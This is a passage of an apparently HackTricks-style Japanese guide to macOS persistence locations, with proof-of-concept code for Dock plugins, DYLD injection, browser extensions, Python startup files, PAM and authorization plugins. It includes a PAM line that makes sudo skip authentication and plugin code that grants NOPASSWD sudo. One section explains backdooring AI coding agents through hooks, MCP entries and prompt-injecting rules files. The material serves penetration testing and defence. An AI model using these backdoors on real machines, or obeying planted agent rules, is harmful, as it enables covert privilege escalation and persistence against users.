アプリが`NSDockTilePlugIn`を宣言すると、Dockは、ログイン時またはそのタイルが追加されたときに、参照先のバンドルを**`com.apple.dock.external.extra`** XPC helper（Apple Siliconでは`...extra.arm64`）に読み込むことがあります。アプリ自体を起動する必要はありません。macOSによってアプリが検出・登録され、受け入れられる必要があります。このhelperは**Apple署名済み**で、`com.apple.security.app-sandbox` entitlementを持たず、`com.apple.security.cs.disable-library-validation`が設定されています。読み込み時にprincipal classの**`setDockTile:`**メソッドが呼び出され、そこから分散通知（例: `com.apple.screenIsLocked`）を購読し、後続のイベントを受け取ることができます。<sup>[[38]](#references)</sup>

macOS 26.5.2では、読み取り専用の`codesign`調査により、helperのApple署名とentitlementsが確認され、インストール済みの複数のアプリで`NSDockTilePlugIn`が宣言されていることも確認されました。このMacには新しいプラグインをインストールも読み込みもしていないため、このリリースで新たに作成したバンドルが実行されるかどうかは未検証です。

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### ウィジェット（Notification Center / WidgetKit）

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - widget extension は**独自のプロセス**で実行され、追加しても Background Task Management の警告は表示されない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - 設定 plist は TCC で保護されたコンテナ内にあるため、外部から編集するには Full Disk Access または TCC bypass が必要

#### 場所

- Widget extension の bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- 有効な/登録済みの widget: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`**（キー `widgets.instances` と `widgets.widgets`）

#### 説明と悪用

アプリに同梱された WidgetKit extension は、Notification Center が管理する**独自のプロセス**で実行されます。`widgets.instances` に（埋め込みの `INIntent` データを含む、base64 でエンコードされた `NSKeyedArchiver` 形式の `CHSWidget` blob）インスタンスを登録し、NotificationCenter を再起動すると、widget がロードされて `TimelineProvider`/intent のコードが実行されます。<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (Run AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Mail.appにアカウントが設定され、起動している必要がある。トリガーは受信メール
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Mailの外部からルールやスクリプトを編集する場合、Mailを終了し、最新のmacOSではFull Disk Accessが必要になることがある

#### 場所

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`**（ローカルルール。Sonoma/Sequoiaでは`V10`、それ以降では`V11`+）
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`**（iCloud同期ルール。こちらが優先される）
- ルールの有効化: **`RulesActiveState.plist`**。AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### 説明と悪用

Apple Mailの**ルール**には、*"Run AppleScript"*アクションを設定できる。細工した**件名**に一致するルールを追加し、攻撃者のスクリプトを実行させると、特定のメールが届くたびにMailのコンテキストで、攻撃者は**リモートからトリガー可能でステルス性の高い**コード実行を実現できる。この手法ではLaunchAgentやLogin Itemが作成されないため、多くのpersistence scannerを回避できる。<sup>[[42]](#references)</sup> トリガーとなるメールを**削除**する設定も加えれば、証拠を隠せる。防御側は、次の場所を直接調査できる。<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### 構成プロファイル (.mobileconfig)

解説: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- sandbox の bypass に有用: [🔴](https://emojipedia.org/large-red-circle)
  - 最新の macOS では、System Settings → *Device Management* で**ユーザーによる手動承認**が必要です（MDM 外では、サイレントな `profiles install` は使えなくなっています）
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- インストール済みプロファイルは **`/Library/Managed Preferences/`** と **`/var/db/ConfigurationProfiles/`** にあり、プロファイルは `PayloadContent` 配列を含む XML plist です。

#### 説明と悪用

`.mobileconfig` は直接コードを実行するプリミティブではありませんが、**信頼されたルート CA** (`com.apple.security.root`)、**グローバルまたは PAC プロキシ** (`com.apple.proxy.*`)、**管理対象の環境設定** (`com.apple.ManagedClient.preferences`)、または制限などの構成を永続化できます。macOS 10.15 以降では、Apple の [`PayloadRemovalDisallowed` の定義](https://developer.apple.com/documentation/devicemanagement/toplevel)によると、**手動でインストールされた**プロファイルでこれを `true` に設定し、削除パスワードの payload がない場合、削除には**管理者認証**が必要です。ただし、そのプロファイルが絶対に削除できなくなるわけではありません。MDM でインストールされたプロファイルには、別の管理・削除ルールが適用されます。<sup>[[44]](#references)</sup>

> [!WARNING]
> 通常の構成プロファイルには、任意の `LaunchDaemon`/`LaunchAgent` を配置する payload type は**ありません**。その方法で daemon をインストールするには、完全な **MDM enrollment** と管理 agent/script が必要です。.mobileconfig を launchd の配布手段として扱わないでください。

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- sandbox bypassに有用: [🔴](https://emojipedia.org/large-red-circle)
  - dyldはSIP/platform binaries、hardened-runtime apps、setuid targetsに対して`DYLD_*`を**除去**するため、保護されていないプロセスにのみ注入し、SIPやhardened runtimeをバイパスすることは**ありません**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- 信頼できる方法: 悪意のある`LaunchAgent`/`LaunchDaemon` plist内の**`EnvironmentVariables`** dict（ログイン時/起動時に実行）
- 廃止済み/歴史的（報告のみ）: **`~/.MacOSX/environment.plist`**（10.8で削除）および**`/etc/launchd.conf`**（10.10で削除）

#### 説明と悪用

攻撃者が被害者プロセスの環境変数に`DYLD_INSERT_LIBRARIES`を設定できると、dyldは攻撃者のdylibをそのプロセスに読み込みます（そのコンストラクタが実行されます）。永続化する場合は、この変数をLaunchAgentに埋め込み、ジョブが起動するたびに再注入します。なお、最近のmacOSでは`launchctl setenv DYLD_*`はフィルタリングされるため、代わりにplistに埋め込んでください。<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

dylib injection/hijacking の全容については、以下を参照してください。

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLI（hooks、MCP servers、rules files）

解説記事: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>、[Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- sandbox の回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - 該当する agent を開発者が使用する必要があります。agent が設定を受け入れると、起動コマンドはそのユーザーの権限で実行されます。workspace trust と MCP の承認要件は、製品やセッションモードによって異なります。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)（ユーザーとして実行され、ターミナル/agent がすでに持つ権限を継承）

#### 場所

明示的に設定された hook および MCP の設定ファイルは、**開発者がツールを使用したときに shell commands または child processes を実行**させる可能性があります。ユーザーごとのグローバルファイル（persistence）から実行される場合と、リポジトリにコミットされたファイル（supply-chain）から実行される場合があります。`CLAUDE.md`、`AGENTS.md`、`GEMINI.md`、および editor rules は **agent への指示であり**、読み込まれた際に shell が確実に実行されるわけではありません。その効果は agent の挙動とツールの権限に依存します。各製品の現在の trust および承認ルールを確認してください。

- **Claude Code**
  - `~/.claude/settings.json`、プロジェクトの `.claude/settings.json`、`.claude/settings.local.json`、および root のみが管理する **`/Library/Application Support/ClaudeCode/managed-settings.json`**（MDM/managed settings **はユーザーが上書きできない** → 強力な persistence）
  - `hooks` object — イベント `PreToolUse`、`PostToolUse`、`UserPromptSubmit`、`Stop`、`SubagentStop`、`SessionStart`、`SessionEnd`、`Notification`、`PreCompact` のそれぞれで shell `command` を実行
  - `statusLine.command` — status line の描画に使われる shell command（毎セッション実行）
  - `~/.claude.json` / プロジェクトの `.mcp.json` にある MCP servers — `command`+`args` を child processes として起動
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — prompt injection を試みる指示。実際の影響は agent の挙動とツールの権限に依存
- **OpenAI Codex CLI**: `~/.codex/config.toml` の `[mcp_servers.*]`（`command`/`args` を child processes として起動）；プロジェクトの指示ファイル `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json`（`hooks`、MCP servers）；`GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json`（`beforeShellExecution`、`afterAgentResponse`、`stop`、…でコマンドを実行）；`.cursor/rules/`、`.cursorrules`、`~/.cursor/mcp.json`；GitHub Copilot の `.github/copilot-instructions.md`

#### 説明と悪用

攻撃者がアカウントのユーザーグローバル設定を変更できる場合、その hook または MCP commands は、今後そのアカウントで開始されるセッション中に実行できます。リポジトリが制御する設定は別のケースです。[現在の Claude Code security docs](https://code.claude.com/docs/en/security) では、対話型の workspace trust ダイアログと、プロジェクトの `.mcp.json` servers に対する別個の承認プロンプトが説明されています。[権限マトリクス](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) によると、親フォルダーが trust された後に hooks が実行される場合があります。また、`claude -p`/SDK sessions では対話型の trust プロンプトは表示されず、これらの非対話型モードではプロジェクトの MCP servers が承認プロンプトなしで接続されます。CVE-2025-59536 として報告された、trust 前にプロジェクトの hook が実行される問題は[2025年に修正済み](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)です。これを現在のデフォルトの挙動とみなさないでください。侵入経路には、侵害されたリポジトリや悪意のある installer が含まれる場合があります。rules file による prompt injection は、明示的な hook より挙動が予測しにくく、依然としてツールの承認に左右されます。<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Claude Code のユーザーグローバル設定の例。テスト時は使い捨てのアカウントにのみ配置してください。

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

ユーザー全体に適用される Codex MCP 設定の例：

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Cursor hook configurationの例。使用する前に、インストール済みバージョンのschemaを確認してください:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions (Chromium: Chrome / Brave / Edge)

解説: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- sandbox のバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
  - 対応ブラウザーと、インストール済みで有効になっている拡張機能が必要です。macOS の External Extensions ではユーザーの確認が必要です。管理対象の強制インストールには、適用可能なエンタープライズポリシーが必要です。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> これは **native messaging hosts** とは別のものです（上記の *Chrome native messaging hosts* セクションを参照）。ここで永続化するのは、**自動インストールされた拡張機能**そのものです。

#### 場所

- **External Extensions JSON**（ブラウザー起動時に検出され、その後 macOS では有効化の確認が求められる）:
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json`（ユーザー単位）または `/Library/Application Support/Google/Chrome/External Extensions/`（全ユーザー）
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- 管理対象の設定 / 構成プロファイルによる**エンタープライズポリシーの強制インストール**:
  - `com.google.Chrome` キーの `ExtensionInstallForcelist`（Brave は `com.brave.Browser`、Edge は `com.microsoft.Edge`）。`/Library/Managed Preferences/` またはインストール済みの `.mobileconfig` から読み込まれます。

#### 説明と悪用

これらは異なる2つのインストール方法です。Chrome の [external-install documentation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) によると、*External Extensions* ファイルを通じて提供される拡張機能は、**Windows と macOS のユーザーが確認して有効化する必要があります**。JSON ファイルを書き込んだだけでは実行されません。macOS で全ユーザー向けにインストールする場合、Chrome は外部拡張機能のファイルが、権限のないユーザーによる変更から保護されていることも要求します。管理対象の `ExtensionInstallForcelist` または `ExtensionSettings` ポリシーを使えば、ユーザーの操作なしで拡張機能をインストールして固定できます。[Google's Mac policy guide](https://support.google.com/chrome/a/answer/7517624) では、管理対象の設定について説明されており、強制インストールされた拡張機能はユーザーが削除できないと記載されています。これはポリシーによる展開方法であり、ユーザー単位の `defaults write` による簡易な方法ではありません。<sup>[[49]](#references)</sup>

> [!WARNING]
> macOS では、*External Extensions* JSON マニフェストの参照先は、ローカルの CRX ではなく **Chrome Web Store** の更新 URL でなければなりません。管理ポリシーによる展開には独自のエンタープライズ要件があり、管理対象のセルフホスト更新 URL が許可される場合があります。テスト用プロファイルでローカルの unpacked extension を使う場合、Chrome の開発者モードの `--load-extension=/path` スイッチは別の仕組みであり、External Extensions JSON ファイルを自動実行させるものではありません。`Secure Preferences` への書き込みを、文書化されているどちらかの登録方法と同等のものとして扱わないでください。

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

その使い捨てアカウントで Chrome を起動し、有効化プロンプトを確認します。ユーザーが承認すると、拡張機能自体の動作が実行 PoC になります。テスト後は、manifest を削除し、そのプロファイルで拡張機能を無効化またはアンインストールしてください。この方法は、調査用 Mac のアクティブな Chrome プロファイルでは**テストしていません**。管理ポリシー経由の方法も、同じ Mac では導入していません。

Force-install と External Extensions は、**Chrome Web Store** の拡張機能 ID を参照します。プロファイルの HMAC 署名付き `Secure Preferences` を編集してローカル拡張機能を密かに注入する、より低レベルの手法や、その他の Chromium プロセスの悪用については、次を参照してください。

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme と File-Type Handler（LaunchServices）

解説：[カスタム URL Scheme を使ったリモート Mac Exploitation（Objective-See）](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- sandbox のバイパスに有効: [✅](https://emojipedia.org/check-mark-button)
  - トリガーは、被害者がリンク（例: Chrome/Brave/Safari 内）をクリックするか、登録済みの種類のファイルを開くことです
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`CFBundleURLTypes`/`CFBundleURLSchemes`**（カスタム URL scheme）または **`CFBundleDocumentTypes`**（ファイル拡張子/UTI）を宣言するアプリバンドルの `Info.plist`
- ユーザーごとの実効的なデフォルト設定は、**`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**（`LSHandlers` 配列）に記録される場合があります。URL scheme のデフォルトを選択するために Apple がサポートする API は `LSSetDefaultHandlerForURLScheme` です。この plist を直接書き換える方法は、文書化された登録方法でもキャッシュ更新方法でもありません。

#### 説明と悪用

Launch Services は、登録済みアプリの `Info.plist` から URL scheme と document の関連付けを取得します。[Apple の登録ガイド](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html)によると、登録は Finder がアプリを検出したとき、起動時またはログイン時、あるいは明示的な登録 API を通じて行われます。アプリをどこかに置くだけでは、即時に登録が実行される保証はありません。登録後は、一致する URL または document を開くと、ユーザーが選択したデフォルトハンドラーや通常の macOS 起動チェックに従って、選択されたハンドラーアプリが起動することがあります。サポート対象の `LSSetDefaultHandlerForURLScheme` API は、ユーザーが優先する URL ハンドラーを変更しますが、新たに配置したアプリを自動実行させるものではありません。<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 の調査用 Mac では、アプリを登録せず、ハンドラーの優先設定も変更していません。実際のハンドラーをテストするには、使い捨てのユーザーアカウントを使い、一意な scheme を持つ marker-only app を登録してその URL を呼び出し、その後アプリと登録を削除してください。

ファイル拡張子および URL scheme のハンドラーを詳しく列挙・悪用する方法については、以下を参照してください。

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

<a id="python-startup-files-pth--usercustomize--sitecustomize"></a>

### Python の startup files（`.pth` / `.start` / `usercustomize` / `sitecustomize`）

解説: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - 対象の site directory が有効な状態で、該当する Python interpreter が起動すると実行されます。この trigger は、すべての virtual environment、Python build、startup flag で共通ではありません。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - interpreter を起動したプロセスの privileges/TCC で実行されます。

#### Location

- **`$(python3 -m site --user-site)/*.pth`**（macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`）
  - root は不要（ユーザーが書き込み可能）
  - **Trigger**: user site が有効な状態での、その Python build の起動。`site` module は有効な site directory 内の `.pth` files を処理します。
- **`<site-packages>/*.start`**（Python 3.15 以降。user または interpreter の site directory）
  - **Trigger**: その directory を含み、`site` をロードする interpreter の起動。<sup>[[58]](#references)[[59]](#references)</sup>
- **`<user-site>/usercustomize.py`**
  - root は不要
  - **Trigger**: user site が有効な状態での起動（`site` によって自動 import されます）
- **`<prefix>/site-packages/sitecustomize.py`**（例: `/opt/homebrew/lib/python3.13/site-packages/`、または system paths）
  - interpreter の場所によっては root/admin が必要な場合があります
  - **Trigger**: その site directory を含む interpreter の起動

#### Description & Exploitation

起動時に、Python は通常 `site` を import し、有効な `site-packages` directories 内の `.pth` files を検索します。path の追加に加えて、`.pth` 内の `import ` で始まる行は、記載された module が他で使用されなくても Python code を実行します。Python は `sitecustomize` の import も試み、**user site が有効な場合は** `usercustomize` も import します。<sup>[[56]](#references)</sup> trigger となるのは、変更された directory を参照する interpreter が後から起動することです。`-S` は `site` の処理を無効にします。`-s`、`-I`、または `PYTHONNOUSERSITE` は **user-site** の variant を無効にします。`-I` は通常、global `sitecustomize` を無効にしません。virtual environment によっては user site が除外されることもあります。対象の interpreter については `python3 -m site` で確認してください。

**Python 3.15 以降**では、site directory に `pkg.mod:callable` 形式の entry point を含む `<name>.start` を置くこともできます。site module は interpreter の起動時にその module を import し、引数なしの function を呼び出します。アプリケーションがその package を import しなくても実行されます。たとえば、`foo.start` に `foo.submod:initialize` が含まれている場合、user code より前に `foo.submod.initialize()` が呼び出されます。有効な site directory に書き込める package または actor は、この startup path を利用できます。これは macOS に限られません。`foo.start` と `foo.pth` が同時にある場合、Python 3.15 以降は `.pth` の import lines を実行せず、`.start` の entry を優先します。一方、古い interpreter は `.start` を無視し、`.pth` の行を引き続き実行します。wheel を複数の interpreter でテストする際は、この version の違いが重要です。<sup>[[58]](#references)[[59]](#references)[[60]](#references)</sup>

以下の PoC は macOS 26.5.2 で実行しました。このテストでは `PYTHONUSERBASE` によって user site を一時 directory に移すため、実際の user site は変更されません。

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

両方のマーカーが表示されました。このテストでは、`-s`、`-I`、または `-S` を指定して繰り返すと、両方の **user-site** マーカーが表示されなくなりました。グローバルな site ディレクトリにある `sitecustomize` はテストしていません。

## Root Sandbox Bypass

> [!TIP]
> ここでは、**root** で**ファイルに書き込むだけで**何かを実行できる、または**その他の特殊な条件**が必要な **sandbox bypass** に役立つ起動場所を紹介します。

### Periodic

> [!CAUTION]
> **過去の仕組み:** macOS 26.5.2 のテストマシンには、`/usr/sbin/periodic`、`/etc/defaults/periodic.conf`、`/etc/periodic`、および `com.apple.periodic-*` launch daemons は存在しません。現行システムで `/etc/periodic` を作成しても、その内容がスケジュール実行されるとは限りません。以下の例を使う前に、対象のリリースでコマンドと有効なスケジューラの両方を確認してください。

解説: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root 権限が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - root 権限が必要
  - **トリガー**: 時刻になったとき
- `/etc/daily.local`、`/etc/weekly.local`、または `/etc/monthly.local`
  - root 権限が必要
  - **トリガー**: 時刻になったとき

#### 説明と悪用

古いリリースでは、periodic スクリプト（**`/etc/periodic`**）は **launch daemons**（`/System/Library/LaunchDaemons/com.apple.periodic*`）によってスケジュール実行されていました。macOS Big Sur 11.5 以降、periodic runner は periodic ディレクトリ内のスクリプトを**各ファイルの所有者**として実行するようになり、以前の権限昇格経路は塞がれました。<sup>[[27]](#references)</sup> 以下のコマンドとディレクトリ一覧は過去の出力であり、macOS 26.5.2 でのテスト結果ではありません。

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

**`/etc/defaults/periodic.conf`**に記載されている、定期的に実行される他のスクリプトもあります。

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

古いシステムで `periodic` とその launch daemon がインストールされ、有効になっている場合、`/etc/daily.local`、`/etc/weekly.local`、`/etc/monthly.local` も追加の実行経路でした。無害な読み取り専用チェックは次のとおりです。

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> owner-based rule は periodic ディレクトリ内に直接置かれたスクリプトに適用されます。以前の `999.local` wrapper は、同じ所有者チェックを行わずに `/etc/daily.local`、`/etc/weekly.local`、または `/etc/monthly.local` を source していました。そのため、scheduler が root として実行されると、これらのローカルファイルも root として実行されました。この違いと Big Sur 11.5 での変更については、[元の調査](https://theevilbit.github.io/beyond/beyond_0019/)に記載されています。`periodic` が存在しない場合、これらのパスが有効だと想定してはいけません。

### PAM

解説: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
解説: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandbox のバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- 常に root が必要

#### 説明とExploit

PAM は、macOS 内での簡単な実行よりも**persistence**とマルウェアに重点を置いているため、このブログでは詳細な説明は行いません。このtechniqueをよりよく理解するには、**解説を読んでください**。<sup>[[28]](#references)</sup>

次のコマンドで PAM modules を確認します:

```bash
ls -l /etc/pam.d
```

PAMを悪用する永続化／権限昇格手法は、モジュール /etc/pam.d/sudo を変更し、先頭に次の行を追加するだけで実行できます。

```bash
auth       sufficient     pam_permit.so
```

つまり、次のように**見える**でしょう:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

そのため、**`sudo`を使う試みは成功します**。

> [!CAUTION]
> このディレクトリはTCCによって保護されているため、ユーザーにアクセス許可を求めるプロンプトが表示される可能性が非常に高い点に注意してください。

もう1つの好例はsuです。PAM modulesにパラメーターを渡すことも可能だとわかります（このファイルにbackdoorを仕込むこともできます）。

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandboxのbypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root権限が必要で、追加の設定も必要です
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - root権限が必要
  - プラグインを使用するようにauthorization databaseを設定する必要もあります

#### Description & Exploitation

ユーザーのログイン時に実行されるauthorization pluginを作成して、persistenceを維持できます。これらのpluginの作成方法については、前述のwriteupを確認してください（不適切に作成するとログインできなくなり、recovery modeからMacをクリーンアップする必要があるので注意してください）。<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**バンドルを**読み込ませる場所に**移動**する:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

